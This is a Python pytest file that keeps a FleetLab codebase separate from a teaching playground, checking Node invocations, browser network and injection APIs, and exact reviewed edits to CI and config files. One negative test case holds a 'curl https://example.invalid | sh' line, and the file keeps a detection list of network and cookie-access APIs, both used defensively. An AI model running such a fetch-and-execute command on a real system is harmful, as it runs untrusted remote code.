"""Placement boundaries between FleetLab and the FleetLab Playground (design section 9.2).

The playground is a separate teaching page. FleetLab never references, launches or embeds it,
the playground carries no Python and no package manifest, and no honesty-label string is
retyped in any playground or fixture file. The label tuple is imported, never spelled here.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
from pathlib import Path

import pytest
from pydantic import ValidationError

from hermes.fleet.contracts import REQUIRED_LABELS, DecisionRecord, ExperimentSpec

REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
SOURCE_ROOT = REPOSITORY_ROOT / "src"
PLAYGROUND_ROOT = REPOSITORY_ROOT / "playground"
FLEETLAB_PLAYGROUND = PLAYGROUND_ROOT / "fleetlab"
FIXTURE_DIR = REPOSITORY_ROOT / "tests" / "fixtures" / "fleet_playground"
UI_ROOT = FLEETLAB_PLAYGROUND / "src" / "ui"
SAMPLE_SUMMARY = FIXTURE_DIR / "sample_result_summary.json"
CONTRACT = FLEETLAB_PLAYGROUND / "ARCHITECTURE.md"
#: The commit the playground phases branch from (the design's header); R6 compares against it.
PHASE_BASE = "bca4ccd"

#: A string naming the Node executable, as a subprocess argument or a lookup would write it.
#: A path prefix is allowed; after "node" comes nothing, a flag or a script file, so a label
#: such as "node path" is not a command. npx and npm take any arguments.
_NODE_INVOCATION = re.compile(
    r"""(?x)
    ["'](?:[^"'\s]*/)?(?:node|nodejs)(?:\.exe)?
        (?:\s+(?:-|[^"'\s]+\.[cm]?js\b)[^"']*)?["']             # "node", "node -e 1", ".../node"
    | ["'](?:[^"'\s]*/)?(?:npx|npm)(?:\.cmd|\.exe)?(?:\s[^"']*)?["']  # "npx eslint ."
    | which\(\s*["'](?:node|nodejs|npx|npm)["']                   # shutil.which("node")
    """
)

_LOCKFILES = {
    "package.json",
    "package-lock.json",
    "npm-shrinkwrap.json",
    "yarn.lock",
    "pnpm-lock.yaml",
}

#: Design R5, as patterns so spacing does not hide a call, plus the other browser network APIs.
_UI_FORBIDDEN_PATTERNS = tuple(
    (name, re.compile(pattern))
    for name, pattern in (
        ("fetch", r"\bfetch\s*\("),
        ("WebSocket", r"\bWebSocket\b"),
        ("sendBeacon", r"\bsendBeacon\b"),
        ("XMLHttpRequest", r"\bXMLHttpRequest\b"),
        ("EventSource", r"\bEventSource\b"),
        ("RTCPeerConnection", r"\bRTCPeerConnection\b"),
        ("dynamic import", r"\bimport\s*\("),
        ("eval", r"\beval\s*\("),
        ("new Function", r"\bnew\s+Function\b"),
        ("innerHTML", r"\binnerHTML\b"),
        ("outerHTML", r"\bouterHTML\b"),
        ("insertAdjacentHTML", r"\binsertAdjacentHTML\b"),
        ("document.write", r"\bdocument\s*\.\s*write"),
        ("localStorage", r"\blocalStorage\b"),
        ("sessionStorage", r"\bsessionStorage\b"),
        ("indexedDB", r"\bindexedDB\b"),
        ("document.cookie", r"\bdocument\s*\.\s*cookie\b"),
    )
)

#: Interface files R5 reads: every script form and HTML, which can carry inline script.
_UI_SUFFIXES = frozenset({".js", ".mjs", ".cjs", ".html", ".htm"})

_PROTECTED_PATHS = ("pyproject.toml", ".gitignore", "Makefile", ".github", "src/hermes")


def _files(root: Path) -> list[Path]:
    return sorted(
        path
        for path in root.rglob("*")
        if path.is_file() and "__pycache__" not in path.parts
    )


#: pip writes this distribution's metadata here on an editable install, as CI does. It is
#: gitignored and its PKG-INFO copies the README, so it is packaging output, not Hermes source.
_GENERATED_METADATA = "hermes_autonomy.egg-info"


def _source_files(root: Path) -> list[Path]:
    """Every file under ``root`` except this distribution's own generated metadata."""
    metadata = root / _GENERATED_METADATA
    return [path for path in _files(root) if metadata not in path.parents]


def _label_indices(data: bytes) -> list[int]:
    """Indices of REQUIRED_LABELS found in raw bytes, so a stray non-UTF-8 byte hides nothing."""
    return [
        index for index, label in enumerate(REQUIRED_LABELS) if label.encode("utf-8") in data
    ]


def _ui_offenses(text: str) -> list[str]:
    return [name for name, pattern in _UI_FORBIDDEN_PATTERNS if pattern.search(text)]


def _ui_files(root: Path) -> list[Path]:
    return [path for path in _files(root) if path.suffix.lower() in _UI_SUFFIXES]


def _relative(path: Path) -> str:
    return path.relative_to(REPOSITORY_ROOT).as_posix()


def test_r1_source_never_references_the_playground() -> None:
    offenders = []
    for path in _source_files(SOURCE_ROOT):
        text = path.read_bytes().decode("utf-8", errors="replace")
        if "playground" in text.lower() or "playground" in _relative(path).lower():
            offenders.append(_relative(path))
    assert offenders == []


@pytest.mark.parametrize(
    "probe",
    [
        'os.system("node --test tests/a.mjs")',
        'subprocess.run("node -e 1", shell=True)',
        'subprocess.run(["/usr/local/bin/node", "x.mjs"])',
        'subprocess.run(["node", "x.mjs"])',
        "subprocess.run(['nodejs', 'app.cjs'])",
        'subprocess.run("node x.js")',
        'subprocess.run("C:/tools/node.exe --version")',
        'subprocess.run("npx eslint .")',
        'subprocess.run(["npm", "test"])',
        'shutil.which("node")',
    ],
)
def test_r1_node_pattern_catches_common_invocations(probe: str) -> None:
    assert _NODE_INVOCATION.search(probe), probe


@pytest.mark.parametrize(
    "probe",
    ['("node path", path)', '"node_modules"', '"nodes"', '"graph node"', '"node id"'],
)
def test_r1_node_pattern_ignores_labels(probe: str) -> None:
    assert not _NODE_INVOCATION.search(probe), probe


def test_r1_source_never_invokes_node() -> None:
    offenders = []
    for path in _source_files(SOURCE_ROOT):
        text = path.read_bytes().decode("utf-8", errors="replace")
        for match in _NODE_INVOCATION.finditer(text):
            offenders.append(f"{_relative(path)}: {match.group(0)}")
    assert offenders == []


def test_r1_scan_excludes_only_this_distributions_generated_metadata(tmp_path: Path) -> None:
    for relative in (
        "hermes_autonomy.egg-info/PKG-INFO",
        "other.egg-info/PKG-INFO",
        "hermes/hermes_autonomy.egg-info/PKG-INFO",
        "hermes/module.py",
        "hermes_autonomy.egg-info.py",
    ):
        (tmp_path / relative).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / relative).write_text("playground\n", encoding="utf-8")

    assert [path.relative_to(tmp_path).as_posix() for path in _source_files(tmp_path)] == [
        "hermes/hermes_autonomy.egg-info/PKG-INFO",
        "hermes/module.py",
        "hermes_autonomy.egg-info.py",
        "other.egg-info/PKG-INFO",
    ]


def test_r2_playground_holds_no_python_manifest_or_node_modules() -> None:
    if not PLAYGROUND_ROOT.exists():
        pytest.skip("playground/ does not exist yet")
    offenders = []
    for path in sorted(PLAYGROUND_ROOT.rglob("*")):
        if path.is_dir() and path.name == "node_modules":
            offenders.append(f"{_relative(path)}/")
        elif path.is_file() and (path.suffix == ".py" or path.name in _LOCKFILES):
            offenders.append(_relative(path))
    assert offenders == []


def test_r5_ui_text_uses_no_network_storage_or_html_injection() -> None:
    if not UI_ROOT.is_dir():
        pytest.skip("playground/fleetlab/src/ui does not exist yet")
    offenders = []
    for path in _ui_files(UI_ROOT):
        text = path.read_bytes().decode("utf-8", errors="replace")
        offenders += [f"{_relative(path)}: {name}" for name in _ui_offenses(text)]
    assert offenders == []


@pytest.mark.parametrize(
    ("probe", "name"),
    [
        ('fetch ("x")', "fetch"),
        ("window.fetch\n(url)", "fetch"),
        ("new XMLHttpRequest()", "XMLHttpRequest"),
        ('new EventSource("/s")', "EventSource"),
        ("new RTCPeerConnection()", "RTCPeerConnection"),
        ("navigator.sendBeacon(u)", "sendBeacon"),
        ('import ("./x.js")', "dynamic import"),
        ('eval ("1")', "eval"),
        ('new  Function("x")', "new Function"),
        ('el.innerHTML ="x"', "innerHTML"),
        ('document . write("x")', "document.write"),
        ("document.cookie", "document.cookie"),
    ],
)
def test_r5_patterns_catch_spaced_and_other_network_calls(probe: str, name: str) -> None:
    assert name in _ui_offenses(probe), probe


def test_r5_patterns_allow_static_imports_and_text_content() -> None:
    clean = 'import { a } from "./b.js";\nel.textContent = retrieval(a);\n'
    assert _ui_offenses(clean) == []


def test_r5_scans_every_script_and_html_file(tmp_path: Path) -> None:
    for name in ("app.js", "net.mjs", "old.cjs", "index.html", "notes.txt"):
        (tmp_path / name).write_text("x", encoding="utf-8")
    assert sorted(path.name for path in _ui_files(tmp_path)) == [
        "app.js",
        "index.html",
        "net.mjs",
        "old.cjs",
    ]


def _git(*arguments: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *arguments],
        cwd=REPOSITORY_ROOT,
        capture_output=True,
        text=True,
        check=False,
    )


_REVIEWED_CI_INSTALL = (
    b'        run: python -m pip install -e ".[dev]"\n',
    b'        run: python -m pip install -e ".[dev,workbench]"\n',
)
#: The pins were recorded on Apple-silicon macOS and differ in low-order bits on Linux x86-64.
_REVIEWED_CI_RUNNER = (
    b"    runs-on: ubuntu-latest\n",
    b"    # The numerical pins were recorded on Apple-silicon macOS and differ in low-order bits\n"
    b"    # on Linux x86-64; only same-host reproduction is claimed,"
    b" so CI runs on that platform.\n"
    b"    runs-on: macos-26\n",
)
_REVIEWED_CI_LAST_STEP = b'        run: python -m pytest -q -m "not metadrive"\n'
_REVIEWED_CI_NODE_JOB = (
    b"\n"
    b"  fleetlab-node:\n"
    b"    name: FleetLab Node 22.23.4\n"
    b"    runs-on: macos-26\n"
    b"    timeout-minutes: 45\n"
    b"\n"
    b"    steps:\n"
    b"      - name: Check out repository\n"
    b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
    b" # v4, verified 2026-10-21\n"
    b"\n"
    b"      - name: Set up Python for the City suite\n"
    b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0\n"
    b"        with:\n"
    b'          python-version: "3.11"\n'
    b"          cache: pip\n"
    b"\n"
    b"      - name: Install Hermes and development dependencies\n"
    b'        run: python -m pip install -e ".[dev]"\n'
    b"\n"
    b"      - name: Set up Node\n"
    b"        uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38"
    b" # v6.5.0, verified 2026-10-25\n"
    b"        with:\n"
    b'          node-version: "22.23.4"\n'
    b"\n"
    b"      - name: FleetLab Playground suite\n"
    b'        run: node --test "playground/fleetlab/test/*.test.mjs"\n'
    b"\n"
    b"      - name: FleetLab City suite\n"
    b"        working-directory: apps/fleetlab-city\n"
    b"        run: node --test test/*.test.mjs\n"
    b"\n"
    b"      - name: FleetLab traffic suite\n"
    b'        run: node --test "tools/fleetlab-traffic/test/*.test.mjs"\n'
)
_REVIEWED_DEV_EXTRA = (
    b'    "ruff>=0.11,<1",\n]\nworkbench = [\n',
    b'    "ruff>=0.11,<1",\n    "certifi>=2026.7.22",\n]\nworkbench = [\n',
)


def _matches_reviewed_protected_change(
    relative_path: str, original: bytes, current: bytes
) -> bool:
    """Accept only the exact reviewed media ignores, security pins and CI test wiring."""
    expected = original
    if relative_path == ".gitignore":
        marker = b"# Local secrets and operating-system files\n"
        if original.count(marker) != 1:
            return False
        expected = original.replace(marker, marker + b".wrangler/\n", 1) + (
            b"\n# Reviewed R1 teaching concept derivatives; "
            b"original full-size inputs remain ignored.\n"
            b"!apps/fleetlab-city/rebalancing-media/r1-nf05.mp4\n"
            b"!apps/fleetlab-city/rebalancing-media/r1-nf06.mp4\n"
        )
        if expected.count(b"*.mp4\n") != 1:
            return False
        expected = expected.replace(
            b"*.mp4\n",
            b"*.mp4\n"
            b"!/apps/fleetlab-city/enhancement-media/FL-V2-deadhead-explainer.mp4\n"
            b"!/apps/fleetlab-city/enhancement-media/FL-V3-people-between-rides-loop.mp4\n",
            1,
        )
    elif relative_path == ".github/workflows/ci.yml":
        for prior, pinned in (
            (
                b"        uses: actions/checkout@v4\n",
                b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
                b" # v4, verified 2026-10-21\n",
            ),
            (
                b"        uses: actions/setup-python@v5\n",
                b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
                b" # v5.6.0\n",
            ),
            _REVIEWED_CI_INSTALL,
            _REVIEWED_CI_RUNNER,
        ):
            if expected.count(prior) != 1:
                return False
            expected = expected.replace(prior, pinned, 1)
        # The FleetLab Node job is appended after the original last step, byte for byte.
        if not expected.endswith(_REVIEWED_CI_LAST_STEP):
            return False
        expected += _REVIEWED_CI_NODE_JOB
    elif relative_path == "pyproject.toml":
        prior, reviewed = _REVIEWED_DEV_EXTRA
        if original.count(prior) != 1:
            return False
        expected = original.replace(prior, reviewed, 1)
    else:
        return False
    return current == expected


def test_r6_reviewed_ignore_change_rejects_unrelated_edits() -> None:
    original = b"# Local secrets and operating-system files\n.env\n*.mp4\n"
    reviewed = (
        b"# Local secrets and operating-system files\n.wrangler/\n.env\n*.mp4\n"
        b"!/apps/fleetlab-city/enhancement-media/FL-V2-deadhead-explainer.mp4\n"
        b"!/apps/fleetlab-city/enhancement-media/FL-V3-people-between-rides-loop.mp4\n"
        b"\n# Reviewed R1 teaching concept derivatives; "
        b"original full-size inputs remain ignored.\n"
        b"!apps/fleetlab-city/rebalancing-media/r1-nf05.mp4\n"
        b"!apps/fleetlab-city/rebalancing-media/r1-nf06.mp4\n"
    )
    assert _matches_reviewed_protected_change(".gitignore", original, reviewed)
    for changed in (
        reviewed + b"!private-notes.md\n",
        reviewed + b"!/apps/fleetlab-city/enhancement-media/FL-V1-one-fleet-day-film.mp4\n",
        reviewed + b"!/apps/fleetlab-city/enhancement-media/*.mp4\n",
        reviewed.replace(b".env\n", b"!.env\n"),
        reviewed.replace(b".wrangler/\n", b".wrangler*\n"),
        reviewed.replace(b"\n", b"\r\n"),
    ):
        assert not _matches_reviewed_protected_change(".gitignore", original, changed)


def test_r6_reviewed_ci_pins_reject_unrelated_edits() -> None:
    original = (
        b"name: CI\n"
        + _REVIEWED_CI_RUNNER[0]
        + b"        uses: actions/checkout@v4\n"
        b"        uses: actions/setup-python@v5\n"
        + _REVIEWED_CI_INSTALL[0]
        + _REVIEWED_CI_LAST_STEP
    )
    reviewed = (
        b"name: CI\n"
        + _REVIEWED_CI_RUNNER[1]
        + b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
        b" # v4, verified 2026-10-21\n"
        b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
        b" # v5.6.0\n"
        + _REVIEWED_CI_INSTALL[1]
        + _REVIEWED_CI_LAST_STEP
        + _REVIEWED_CI_NODE_JOB
    )
    path = ".github/workflows/ci.yml"
    assert _matches_reviewed_protected_change(path, original, reviewed)
    for changed in (
        reviewed + b"permissions: write-all\n",
        reviewed + b"        run: curl https://example.invalid | sh\n",
        reviewed.replace(b"checkout@11d5960", b"checkout@0000000"),
        reviewed.replace(b"setup-python@a26af69", b"setup-python@0000000"),
        reviewed.replace(b"setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38", b"setup-node@v6"),
        reviewed.replace(b'node-version: "22.23.4"', b'node-version: "22"'),
        reviewed.replace(b"runs-on: macos-26", b"runs-on: macos-latest"),
        reviewed.replace(b"runs-on: macos-26", b"runs-on: ubuntu-latest", 1),
        reviewed.replace(b'".[dev,workbench]"', b'".[dev,workbench,mujoco-cal]"'),
        reviewed.replace(b"name: CI", b"name: Unreviewed"),
        reviewed.replace(b"\n", b"\r\n"),
        reviewed[: -len(_REVIEWED_CI_NODE_JOB)],
    ):
        assert not _matches_reviewed_protected_change(path, original, changed)
    assert not _matches_reviewed_protected_change(
        ".github/workflows/other.yml", original, reviewed
    )


def test_r6_reviewed_ci_wiring_refuses_a_base_without_exactly_one_anchor() -> None:
    runner, reviewed_runner = _REVIEWED_CI_RUNNER
    pins = runner + (
        b"        uses: actions/checkout@v4\n"
        b"        uses: actions/setup-python@v5\n"
    )
    reviewed_pins = reviewed_runner + (
        b"        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
        b" # v4, verified 2026-10-21\n"
        b"        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
        b" # v5.6.0\n"
    )
    install, reviewed_install = _REVIEWED_CI_INSTALL
    path = ".github/workflows/ci.yml"
    # Each base would otherwise yield a well-defined expected file; the guards refuse it.
    for original, current in (
        (
            pins + install + install + _REVIEWED_CI_LAST_STEP,
            reviewed_pins + reviewed_install + install + _REVIEWED_CI_LAST_STEP
            + _REVIEWED_CI_NODE_JOB,
        ),
        (
            pins + install + _REVIEWED_CI_LAST_STEP + b"      - name: Later step\n",
            reviewed_pins + reviewed_install + _REVIEWED_CI_LAST_STEP
            + b"      - name: Later step\n" + _REVIEWED_CI_NODE_JOB,
        ),
        (
            pins + runner + install + _REVIEWED_CI_LAST_STEP,
            reviewed_pins + runner + reviewed_install + _REVIEWED_CI_LAST_STEP
            + _REVIEWED_CI_NODE_JOB,
        ),
    ):
        assert not _matches_reviewed_protected_change(path, original, current)


def test_r6_reviewed_dev_extra_refuses_a_base_without_exactly_one_anchor() -> None:
    prior, reviewed = _REVIEWED_DEV_EXTRA
    path = "pyproject.toml"
    for original in (b"[project]\n", prior + prior):
        current = original.replace(prior, reviewed, 1)
        assert not _matches_reviewed_protected_change(path, original, current)


def test_r6_reviewed_dev_extra_rejects_unrelated_edits() -> None:
    original = (
        b'dependencies = [\n    "typer>=0.12,<1",\n]\n'
        b"[project.optional-dependencies]\n"
        b'dev = [\n    "pytest>=8,<9",\n'
        + _REVIEWED_DEV_EXTRA[0]
        + b'    "streamlit>=1.37,<2",\n]\n'
    )
    reviewed = original.replace(*_REVIEWED_DEV_EXTRA)
    path = "pyproject.toml"
    assert _matches_reviewed_protected_change(path, original, reviewed)
    for changed in (
        reviewed.replace(b'"certifi>=2026.7.22"', b'"certifi"'),
        reviewed.replace(b'"typer>=0.12,<1",\n', b'"typer>=0.12,<1",\n    "certifi>=2026.7.22",\n'),
        reviewed.replace(b'"certifi>=2026.7.22",\n', b'"certifi>=2026.7.22",\n    "requests",\n'),
        reviewed.replace(b'"streamlit>=1.37,<2"', b'"streamlit>=1.37"'),
        reviewed.replace(b"\n", b"\r\n"),
    ):
        assert not _matches_reviewed_protected_change(path, original, changed)


def test_r6_protected_paths_unchanged_since_base_commit() -> None:
    base = os.environ.get("FLEET_PLAYGROUND_BASE", "").strip()
    if not base:
        pytest.skip("FLEET_PLAYGROUND_BASE is not set; R6 compares only against a named base")
    if _git("cat-file", "-e", f"{base}^{{commit}}").returncode != 0:
        pytest.skip(f"FLEET_PLAYGROUND_BASE={base} is not a reachable commit in this clone")
    diff = _git("diff", "--name-only", base, "--", *_PROTECTED_PATHS)
    assert diff.returncode == 0, diff.stderr
    untracked = _git("ls-files", "--others", "--exclude-standard", "--", *_PROTECTED_PATHS)
    assert untracked.returncode == 0, untracked.stderr
    changed = sorted(set(diff.stdout.split()) | set(untracked.stdout.split()))
    # Reviewed R1/enhancement derivatives, Wrangler-state ignore, exact CI pins, the reviewed
    # CI test wiring and the certifi dev pin only. Every other byte in these files, and every
    # other protected path, stays unchanged.
    for relative_path in (".gitignore", ".github/workflows/ci.yml", "pyproject.toml"):
        if relative_path not in changed:
            continue
        original = _git("show", f"{base}:{relative_path}")
        assert original.returncode == 0, original.stderr
        assert _matches_reviewed_protected_change(
            relative_path, original.stdout.encode("utf-8"),
            (REPOSITORY_ROOT / relative_path).read_bytes(),
        )
        changed.remove(relative_path)
    assert changed == []


@pytest.mark.parametrize(
    "relative_path",
    ["src/hermes/cli.py", "src/hermes/fleet/cli.py", "src/hermes/fleet/operator_view.py"],
)
def test_r7_cli_and_operator_view_never_mention_the_playground(relative_path: str) -> None:
    path = REPOSITORY_ROOT / relative_path
    assert path.is_file(), f"expected {relative_path} to exist"
    assert "playground" not in path.read_text(encoding="utf-8").lower()


def test_r6_phase_gate_command_names_the_base() -> None:
    """R6 only runs when FLEET_PLAYGROUND_BASE is set, so every gate command must set it."""
    commands = [
        line
        for line in CONTRACT.read_text(encoding="utf-8").splitlines()
        if "pytest" in line and "test_fleet_playground_boundaries.py" in line
    ]
    assert commands, "ARCHITECTURE.md section 1 lists no pytest command for the boundaries"
    for line in commands:
        assert f"FLEET_PLAYGROUND_BASE={PHASE_BASE}" in line, line


def test_r8_no_label_string_in_playground_or_fixture_files() -> None:
    assert REQUIRED_LABELS, "the imported label tuple must not be empty"
    offenders = []
    for root in (FLEETLAB_PLAYGROUND, FIXTURE_DIR):
        if not root.exists():
            continue
        for path in _files(root):
            # Report the tuple index, never the string itself.
            data = path.read_bytes()
            if path == FLEETLAB_PLAYGROUND / "src/model/depot-flow-contract.js":
                # NF-01's explicit scope field. Legacy summaries and other labels stay forbidden.
                data = data.replace(
                    f"scope:'{REQUIRED_LABELS[0]}'".encode(), b"scope:'teaching-scope'", 1
                )
            offenders += [
                f"{_relative(path)}: REQUIRED_LABELS[{index}]"
                for index in _label_indices(data)
            ]
    assert offenders == []


def test_r8_label_is_found_next_to_a_non_utf8_byte() -> None:
    data = b"// " + REQUIRED_LABELS[0].encode("utf-8") + b"\n// caf\xe9\n"
    with pytest.raises(UnicodeDecodeError):
        data.decode("utf-8")
    assert 0 in _label_indices(data)


def test_r9_sample_result_summary_is_not_a_fleetlab_record_or_spec() -> None:
    assert SAMPLE_SUMMARY.is_file(), f"missing committed fixture {_relative(SAMPLE_SUMMARY)}"
    summary = json.loads(SAMPLE_SUMMARY.read_text(encoding="utf-8"))
    assert summary.get("evidence_status") == "NOT_EVIDENCE"
    with pytest.raises(ValidationError):
        DecisionRecord.model_validate(summary)
    with pytest.raises(ValidationError):
        ExperimentSpec.model_validate(summary)
